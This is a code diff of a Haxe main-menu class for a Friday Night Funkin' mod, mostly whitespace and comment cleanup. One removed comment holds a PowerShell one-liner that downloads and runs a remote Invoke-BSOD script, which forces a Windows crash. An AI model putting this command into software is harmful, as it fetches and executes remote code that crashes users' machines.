@@ -21,6 +21,7 @@ import sys.io.File;
 using StringTools;
 import flixel.util.FlxTimer;
 import Options;
+
 class MainMenuState extends MusicBeatState
 {
 	static var curSelected:Int = 1;
@@ -33,16 +34,15 @@ class MainMenuState extends MusicBeatState
 	var magenta:FlxSprite;
 	var camFollow:FlxObject;
 	var trixie:FlxSprite;
-		var doof:DialogueBox;
+	var doof:DialogueBox;
 
 	override function create()
 	{
-		
 		doof = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt("trixiedialogue")),false);
-		
+
 		TitleState.curDir = "assets";
+
 		#if desktop
-		// Updating Discord Rich Presence
 		DiscordClient.changePresence("In the Menus", null);
 		#end
 
@@ -52,16 +52,7 @@ class MainMenuState extends MusicBeatState
 		}
 
 		persistentUpdate = persistentDraw = true;
-/*
-		var bg:FlxSprite = new FlxSprite(-80).loadGraphic(Paths.image('menuBG'));
-		bg.scrollFactor.x = 0;
-		bg.scrollFactor.y = 0.18;
-		bg.setGraphicSize(Std.int(bg.width * 1.1));
-		bg.updateHitbox();
-		bg.screenCenter();
-		bg.antialiasing = true;
-		add(bg);
-*/
+
 		camFollow = new FlxObject(0, 0, 1, 1);
 		add(camFollow);
 
@@ -74,8 +65,6 @@ class MainMenuState extends MusicBeatState
 		magenta.visible = false;
 		magenta.antialiasing = true;
 		magenta.color = 0xFFfd719b;
-		//add(magenta);
-		// magenta.scrollFactor.set();
 
 		menuItems = new FlxTypedGroup<FlxSprite>();
 		var bg:BGSprite = new BGSprite('mainmenu/bg', -220.6, -151.2);
@@ -95,10 +84,8 @@ class MainMenuState extends MusicBeatState
 		}
 		trixie.antialiasing = true;
 		add(trixie);
-		
-		
+
 		add(menuItems);
-		
 
 		for (i in 0...optionShit.length)
 		{
@@ -115,19 +102,17 @@ class MainMenuState extends MusicBeatState
 		menuItems.members[0].setPosition(19.95, 411);
 		menuItems.members[1].setPosition(159.25, 64);
 		menuItems.members[2].setPosition(645.45, 411);
-		//FlxG.camera.follow(camFollow, null, 0.06);
 
 		var versionShit:FlxText = new FlxText(5, FlxG.height - 36, 0, "Laughter Edition [1.0.1] - Andromeda Engine B6", 18);
 		versionShit.scrollFactor.set();
 		versionShit.setFormat("Woodrow W00 Reg", 16, FlxColor.WHITE, LEFT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
 		add(versionShit);
 
-				new FlxTimer().start(12, function(e:FlxTimer){
-					
-					if(trixie.animation.curAnim.name != 'notice')trixie.animation.play('read');
-					
+		new FlxTimer().start(12, function(e:FlxTimer){
+
+		if(trixie.animation.curAnim.name != 'notice')trixie.animation.play('read');
+
 				},0);
-		// NG.core.calls.event.logEvent('swag').send();
 
 		changeItem(curSelected);
 
@@ -141,14 +126,13 @@ class MainMenuState extends MusicBeatState
 		PlayState.isPony = !PlayState.isPony;
 		india = true;
 		trixie.animation.play('read');
-		
+
 		add(doof);
 	}
 	function playmus(){
 		india = false;
-		
+
 		selectedSomethin = false;
-		//FlxG.sound.playMusic(Paths.music('freakyMenu'));
 	}
 	override public function beatHit():Void 
 	{
@@ -167,22 +151,15 @@ Conductor.songPosition = FlxG.sound.music.time;
 
 		if (!selectedSomethin && !india)
 		{
-			
-			
 			if (FlxG.mouse.overlaps(trixie) && FlxG.mouse.justPressed && !trixied){
 				trixied = true;
 		trixie.animation.play('notice');
 				new FlxTimer().start(1, function(e:FlxTimer){
-					
+
 					diashit();
-					
 				});
-				
 			}
-			
-			
-			
-			
+
 			if (controls.LEFT_P)
 			{
 				FlxG.sound.play(Paths.sound('scrollMenu'));
@@ -211,7 +188,6 @@ Conductor.songPosition = FlxG.sound.music.time;
 					Sys.command('/usr/bin/xdg-open', ["https://ninja-muffin24.itch.io/funkin", "&"]);
 					#else
 					FlxG.openURL('https://ninja-muffin24.itch.io/funkin');
-					//Sys.command("powershell.exe -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
 					#end
 				}
 				else
@@ -291,7 +267,6 @@ Conductor.songPosition = FlxG.sound.music.time;
 	function changeItem(huh:Int = 0,scroll:Bool = true)
 	{
 			curSelected = huh;
-		
 
 		if (curSelected >= menuItems.length)
 			curSelected = 0;
@@ -307,8 +282,6 @@ Conductor.songPosition = FlxG.sound.music.time;
 				spr.animation.play('selected');
 				camFollow.setPosition(spr.getGraphicMidpoint().x, spr.getGraphicMidpoint().y);
 			}
-
-			//spr.updateHitbox();
 		});
 	}
 }
